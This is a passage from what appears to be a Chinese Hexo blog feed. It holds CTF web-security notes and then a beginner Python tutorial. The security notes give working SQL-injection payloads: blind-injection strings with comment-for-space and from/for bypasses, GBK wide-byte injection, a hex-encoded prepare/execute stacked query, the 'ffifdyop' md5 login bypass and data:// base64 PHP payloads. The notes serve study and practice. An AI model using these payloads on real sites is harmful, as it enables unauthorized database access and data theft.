class="line">hex()、bin()==&gt;ascii()</span><br><span class="line">sleep()==&gt;benchmark()</span><br><span class="line">concat_ws()==&gt;group_concat()</span><br><span class="line">mid()、substr()==&gt;substring() @@user==&gt;user() @@datadir==&gt;datadir()</span><br><span class="line"></span><br><span class="line">举例：substring()和substr()无法使用时：</span><br><span class="line">?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74或者：</span><br><span class="line"></span><br><span class="line">substr((select&#x27;password&#x27;),1,1)=0x70strcmp(left(&#x27;password&#x27;,1),0x69)=1strcmp(left(&#x27;password&#x27;,1),0x70)=0strcmp(left(&#x27;password&#x27;,1),0x71)=-1</span><br></pre></td></tr></table></figure><h5 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">过滤 &#x27; 的时候往往利用的思路是将 &#x27; 转换为 \&#x27; 。</span><br><span class="line">在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：</span><br><span class="line">（1）%df 吃掉 \ 具体的方法是 urlencode(&#x27;\) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（&#x27;）符号在外面：</span><br><span class="line">id=-1%df%27union select 1,user(),3--+</span><br><span class="line"></span><br><span class="line">（2）将 \&#x27; 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。</span><br><span class="line">一般产生宽字节注入的PHP函数：</span><br><span class="line">1.replace（）：过滤 &#x27; \ ，将 &#x27; 转化为 \&#x27; ，将 \  转为 \\，将 &quot; 转为 \&quot; 。用思路一。</span><br><span class="line"></span><br><span class="line">2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：&#x27; , &quot; , \ 。用思路一</span><br><span class="line">（防御此漏洞，要将 mysql_query 设置为 binary 的方式）</span><br><span class="line"></span><br><span class="line">3.mysql_real_escape_string()：转义下列字符：</span><br><span class="line">\x00    \n    \r    \&#x27;&quot;    \x1a</span><br><span class="line">（防御，将mysql设置为gbk即可）</span><br></pre></td></tr></table></figure><h3 id="web-7-1"><a href="#web-7-1" class="headerlink" title="web-7"></a>web-7</h3><p>&#x3D;&#x3D;有时候单引号也会过滤所以最后数据库可以尝试双引号，如果前面正常注入成功&#x3D;&#x3D;</p><h3 id="web-8-1"><a href="#web-8-1" class="headerlink" title="web-8"></a>web-8</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤了逗号，单引号，空格</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;大部分过滤了逗号的都可以使用盲注绕过&#x3D;&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">过滤了逗号使用from for</span><br><span class="line">vince&#x27;/**/or/**/ascii(substr(database()from/**/1/**/for/**/1))=119#</span><br><span class="line">然后使用burp爆破表名和字段名</span><br><span class="line"></span><br><span class="line">id=1/**/or/**/ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/1/**/for/**/1))=102#</span><br></pre></td></tr></table></figure><h6 id="十六进制编码绕过"><a href="#十六进制编码绕过" class="headerlink" title="十六进制编码绕过"></a>十六进制编码绕过</h6><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show databases;#</span><br><span class="line">如果这样有回显才可以使用下面这个十六进制绕过</span><br><span class="line"></span><br><span class="line">1&#x27;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</span><br></pre></td></tr></table></figure><h3 id="web-9-1"><a href="#web-9-1" class="headerlink" title="web-9"></a>web-9</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">尝试用sql注入的万能密码绕过,都无果</span><br><span class="line">最后用dirsearch扫描网站发现.robots.txt目录，里面有index.phps</span><br><span class="line">分析代码，md5，sql注入绕过</span><br><span class="line"></span><br><span class="line">SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&quot;.md5($password,true).&quot;&#x27;</span><br><span class="line">true默认不写则为false，则转换为32位16进制的字符串。</span><br><span class="line">true为16位原始二进制的字符串</span><br><span class="line"></span><br><span class="line">32位16进制字符串的意思是：将MD5加密得到的128 位长度的&quot;指纹信息&quot;，以每4位为一组，分为32组，每组以转换为16进制，进行转换得到一个32位的字符串。</span><br><span class="line">16位原始二进制格式的字符串的意思是：将128 位长度的&quot;指纹信息&quot;分组转化为16位的一个字符串，然后两个字符为一组，依照ACILL码转化为字符串。</span><br><span class="line"></span><br><span class="line">如果为true，我们有一个万能密码，ffifdyop，转换为字符串为&#x27;or&#x27;6(后面乱码)</span><br><span class="line"></span><br><span class="line">在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，</span><br><span class="line">那么就相当于password=‘xxx’ or 1  ，也就相当于password=‘xxx’ or true，</span><br><span class="line">所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的</span><br><span class="line">所以上面万能密码就变成了&#x27;or&#x27;truexxx</span><br></pre></td></tr></table></figure><h1 id="CTF记录"><a href="#CTF记录" class="headerlink" title="CTF记录"></a>CTF记录</h1><h3 id="引号解析"><a href="#引号解析" class="headerlink" title="引号解析"></a>引号解析</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php中：</span><br><span class="line">&quot;解析变量&quot;，&#x27;不解析变量&#x27;</span><br></pre></td></tr></table></figure><h3 id="浏览器传参对文本进行操作多用URL编码"><a href="#浏览器传参对文本进行操作多用URL编码" class="headerlink" title="浏览器传参对文本进行操作多用URL编码"></a>浏览器传参对文本进行操作多用URL编码</h3><p><strong>换行</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0A</span><br></pre></td></tr></table></figure><h3 id="类型转换的优先级"><a href="#类型转换的优先级" class="headerlink" title="类型转换的优先级"></a>类型转换的优先级</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">优先级总结：</span><br><span class="line">浮点数和整数：浮点数和整数进行比较时，整数会被转换为浮点数，然后进行比较。</span><br><span class="line">布尔值：布尔值会转换为整数（false 转为 0，true 转为 1）。</span><br><span class="line">字符串：字符串会与其他类型的值进行转换。数值会被转换为字符串，或者其他类型的值会转换为字符串进行比较。</span><br><span class="line">数组：空数组视为 false，非空数组视为 true。</span><br><span class="line">对象：对象首先会尝试转换为字符串，如果没有 __toString() 方法，则转换为布尔值。</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;编码影响&#x3D;&#x3D;</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如base64编码的+和=可能被浏览器解析成为其他字符，而不是源码字符，所以这时对一些被浏览器过滤的字符进行URL编码</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br><span class="line">data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</span><br><span class="line">这个例子中多了一个引号就发生了浏览器解析错误,这个加号被解析成空格可能</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python学习</title>
      <link href="/2024/11/16/python%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/11/16/python%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>[Toc]</p><h1 id="Python学习"><a href="#Python学习" class="headerlink" title="Python学习"></a>Python学习</h1><h3 id="input输入"><a href="#input输入" class="headerlink" title="input输入"></a>input输入</h3><p>&#x3D;&#x3D;python对缩进有着严格的要求，这里的print和input都是顶格写&#x3D;&#x3D;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#input()内的作用和print（）一样，都是打印，但是如果这样操作，输入不会换行</span></span><br><span class="line">name=<span class="built_in">input</span>(<span class="string">&quot;What is your name ?&quot;</span>)</span><br><span class="line">num=<span class="built_in">input</span>(<span class="string">&quot;What is your number ?&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(num))</span><br><span class="line"><span class="comment">#input输入数据都是字符串类型</span></span><br><span class="line"><span class="built_in">int</span>(num)</span><br><span class="line"><span class="built_in">print</span>(num)</span><br><span class="line"></span><br><span class="line"><span class="comment">#练习 欢迎登录小程序</span></span><br><span class="line">user_name=<span class="built_in">input</span>()</span><br><span class="line">user_type=<span class="built_in">input</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;您好：%s,您是尊贵的：%s用户，欢迎您的光临。&quot;</span>%(user_name,user_type))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">What is your name ?123#他会让你输入一些数据，123是我输入的数据</span><br><span class="line">What is your number ?123</span><br><span class="line">&lt;class &#x27;str&#x27;&gt;</span><br><span class="line">123</span><br><span class="line">123</span><br><span class="line">123</span><br><span class="line">您好：123,您是尊贵的：123用户，欢迎您的光临。</span><br></pre></td></tr></table></figure><h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1+1=&quot;</span>,<span class="number">1</span>+<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1-1=&quot;</span>,<span class="number">1</span>-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1*1=&quot;</span>,<span class="number">1</span>*<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;8/3=&quot;</span>,<span class="number">8</span>/<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;7//2=&quot;</span>,<span class="number">7</span>//<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;5%3=&quot;</span>,<span class="number">5</span>%<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;2**3=&quot;</span>,<span class="number">2</span>**<span class="number">3</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1+1= 2</span><br><span class="line">1-1= 0</span><br><span class="line">1*1= 1</span><br><span class="line">8/3= 2.6666666666666665</span><br><span class="line">7//2= 3</span><br><span class="line">5%3= 2</span><br><span class="line">2**2= 8</span><br></pre></td></tr></table></figure><h3 id="精确度和字符串拼接"><a href="#精确度和字符串拼接" class="headerlink" title="精确度和字符串拼接"></a>精确度和字符串拼接</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">name=<span class="string">&quot;YYSSH&quot;</span></span><br><span class="line">num=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My name is&quot;</span>,name,<span class="string">&quot;My number is&quot;</span>,num)</span><br><span class="line"></span><br><span class="line"><span class="comment">#   %s表示占位符，后面%括号里面表示替代前面%s</span></span><br><span class="line">message=<span class="string">&quot;My name is %s,My number is %s&quot;</span>%(name,num)</span><br><span class="line"></span><br><span class="line"><span class="comment">#    %s表示str占位符，%d表示int的占位符，%f表示float的占位符</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num3=<span class="number">11</span></span><br><span class="line">num4=<span class="number">15.557879798</span></span><br><span class="line"><span class="comment">#     首先是%d表示int占位符，然后%后的辅助符号第一个表示宽度</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;宽度限制5 结果是%5d&quot;</span>%num3)</span><br><span class="line"></span><br><span class="line"><span class="comment">#     若限制宽度小于数字本身宽度，则不生效</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;宽度限制1 结果是%1d&quot;</span>%num3)</span><br><span class="line"></span><br><span class="line"><span class="comment">################若控制精度则数值会四舍五入###################</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#      首先是%f表示float占位符，%后的第一位表示宽度，第二位表示保留小数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;宽度限制7，保留两位小数 结果是%7.2f&quot;</span>%num4)</span><br><span class="line"></span><br><span class="line"><span class="comment">#      若%后没有第一位只有小数点后位，则表示宽度没有限制</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;没有宽度限制，保留两位小数 结果是%.2f&quot;</span>%num4)</span><br><span class="line"></span><br><span class="line"><span class="comment">##########快速格式化########</span></span><br><span class="line">Name=<span class="string">&quot;YYSSH&quot;</span></span><br><span class="line">set_num=<span class="number">1.01123</span></span><br><span class="line">set_num2=<span class="number">12312</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#进行所有括号内部格式化(将变量进行数据输出)，但是不能控制精度</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;My name is <span class="subst">&#123;Name&#125;</span>,My num1 is<span class="subst">&#123;set_num&#125;</span>,My num2 is<span class="subst">&#123;set_num2&#125;</span>&quot;</span>)</span><br><span class="line">nb=<span class="string">f&quot;My name is <span class="subst">&#123;Name&#125;</span>,My num1 is<span class="subst">&#123;set_num&#125;</span>,My num2 is<span class="subst">&#123;set_num2&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">print</span>(nb)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">My name is YYSSH My number is 1</span><br><span class="line">宽度限制5 结果是   11</span><br><span class="line">宽度限制1 结果是11</span><br><span class="line">宽度限制7，保留两位小数 结果是  15.56</span><br><span class="line">没有宽度限制，保留两位小数 结果是15.56</span><br><span class="line">My name is YYSSH,My num1 is1.01123,My num2 is12312</span><br><span class="line">My name is YYSSH,My num1 is1.01123,My num2 is12312</span><br></pre></td></tr></table></figure><h3 id="while循环-for循环"><a href="#while循环-for循环" class="headerlink" title="while循环\for循环"></a>while循环\for循环</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">num = <span class="number">1</span></span><br><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> num &lt;=<span class="number">100</span> :</span><br><span class="line">    <span class="built_in">sum</span> += num</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> Ture:<span class="comment">#死循环</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5050</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">name=<span class="string">&quot;itheima is a brand of itcast&quot;</span></span><br><span class="line">count=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> name :</span><br><span class="line">    <span class="keyword">if</span> x==<span class="string">&#x27;a&#x27;</span> :</span><br><span class="line">        count+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(count)</span><br><span class="line"></span><br><span class="line">count=<span class="number">0</span></span><br><span class="line">num =<span class="number">3</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,num+<span class="number">1</span>):<span class="comment">#没有取num+1</span></span><br><span class="line">    <span class="built_in">print</span>(x)</span><br><span class="line">    <span class="keyword">if</span> x%<span class="number">2</span>==<span class="number">0</span> :</span><br><span class="line">        count+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(count)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">1</span><br></pre></td></tr></table></figure><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>&#x3D;&#x3D;def定义带有名称的函数&#x3D;&#x3D;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">函数名</span>：</span><br><span class="line">直接用</span><br><span class="line">    返回值(可以有多个) e.g. retrun <span class="number">1</span>,<span class="string">&quot;yanyuan&quot;</span>,&#123;<span class="number">123</span>&#125;</span><br><span class="line">    </span><br><span class="line">    x,y,z=函数名()</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;lambda定义匿名函数&#x3D;&#x3D;</p><p>只能被调用一次（因为没有名字），但可以多次写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lambda</span> x,y:x+y<span class="comment">#只能有一行函数体，冒号后面的即是return返回值也是函数体</span></span><br></pre></td></tr></table></figure><h4 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">user_info</span>(<span class="params">name,age,gender</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span>,<span class="subst">&#123;age&#125;</span>,<span class="subst">&#123;gender&#125;</span>&quot;</span>)</span><br><span class="line">user_info(<span class="string">&quot;yanyuan&quot;</span>,age=<span class="number">20</span>,gender=<span class="string">&quot;男&quot;</span>)<span class="comment">#乱序也可以，但是要指定键</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">user_info</span>(<span class="params">name,age,gender=<span class="string">&quot;男&quot;</span></span>):<span class="comment">#只能在后面设置默认值，也就是默认值后面不允许不是默认值的</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span>,<span class="subst">&#123;age&#125;</span>,<span class="subst">&#123;gender&#125;</span>&quot;</span>)</span><br><span class="line">user_info(<span class="string">&quot;yanyuan&quot;</span>,age=<span class="number">20</span>)<span class="comment">#若不传值，则为设定的默认值男</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">user_info</span>(<span class="params">*args</span>):<span class="comment">#规定叫args，不用也可以*a,*b</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">type</span>(args)&#125;</span>&quot;</span>)<span class="comment">#传进来之后都变成了元组</span></span><br><span class="line">user_info(<span class="string">&quot;yanyuan&quot;</span>,age=<span class="number">20</span>,gender=<span class="string">&quot;男&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user_info</span>(<span class="params">**kwargs</span>):<span class="comment">#规定叫kwargs，不用也可以*a,*b</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">type</span>(kwargs)&#125;</span>&quot;</span>)<span class="comment">#传进来之后都变成了字典</span></span><br><span class="line">user_info(name=<span class="string">&quot;yanyuan&quot;</span>,age=<span class="number">20</span>,gender=<span class="string">&quot;男&quot;</span>)<span class="comment">#所以只能键值对传参</span></span><br></pre></td></tr></table></figure><h3 id="序列-列表、元组、字符串"><a href="#序列-列表、元组、字符串" class="headerlink" title="序列(列表、元组、字符串)"></a>序列(列表、元组、字符串)</h3><h4 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h4><h5 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##增加</span></span><br><span class="line"><span class="comment">#######在指定下标前面插入一个元素###########</span></span><br><span class="line"></span><br><span class="line">mylist=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">mylist.insert(<span class="number">1</span>,<span class="string">&quot;y&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(mylist)</span><br><span class="line"></span><br><span class="line"><span class="comment">#######在列表末尾插入一个元素###########</span></span><br><span class="line"></span><br><span class="line">mylist=[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">mylist.append(<span class="number">9</span>)</span><br><span class="line"><span class="built_in">print</span>(mylist)</span><br><span class="line"></span><br><span class="line"><span class="comment">#######在列表末尾插入一个列表###########</span></span><br><span class="line"></span><br><span class="line">mylist=[<span class="number">0</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">8</span>]</span><br><span class="line">mylist2=[<span class="number">11111</span>,<span class="number">222222</span>,<span class="number">33333</span>]</span><br><span class="line">mylist.extend(mylist2)</span><br><span class="line"><span class="built_in">print</span>(mylist)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[1, &#x27;y&#x27;, 2, 3, 4, 5]</span><br><span class="line">[0, 1, 2, 3, 4, 5, 9]</span><br><span class="line">[0, 2, 4, 5, 6, 8, 11111, 222222, 33333]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##删除</span></span><br><span class="line"><span class="comment">#######在指定下标删除一个元素###########</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##Example(1)</span></span><br><span class="line">mylist=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">56</span>,<span class="number">6</span>,<span class="number">7</span>]</span><br><span class="line"><span class="keyword">del</span> mylist[<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(mylist)</span><br><span class="line"></span><br><span class="line"><span class="comment">##Example(2)</span></span><br><span class="line">mylist=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">56</span>,<span class="number">67</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">8</span>]</span><br><span class="line">pop=mylist.pop(<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(mylist)</span><br><span class="line"><span class="built_in">print</span>(pop)</span><br><span class="line"></span><br><span class="line"><span class="comment">##Example(3)  #只会删除第一个匹配项目</span></span><br><span class="line">mylist=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">56</span>,<span class="number">67</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">8</span>]</span><br><span class="line">mylist.remove(<span class="number">7</span>)</span><br><span class="line"><span class="built_in">print</span>(mylist)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[1, 2, 4, 56, 6, 7]</span><br><span class="line">[1, 2, 3, 4, 67, 7, 7, 8]</span><br><span class="line">56</span><br><span class="line">[1, 2, 3, 4, 56, 67, 7, 8]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##修改</span></span><br><span class="line"><span class="comment">#######在指定位置修改一个元素###########</span></span><br><span class="line"></span><br><span class="line">mylist=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">56</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">1</span>]</span><br><span class="line">mylist[<span class="number">5</span>]=<span class="number">999999</span></span><br><span class="line"><span class="built_in">print</span>(mylist)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1, 2, 3, 4, 56, 999999, 8, 1]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td 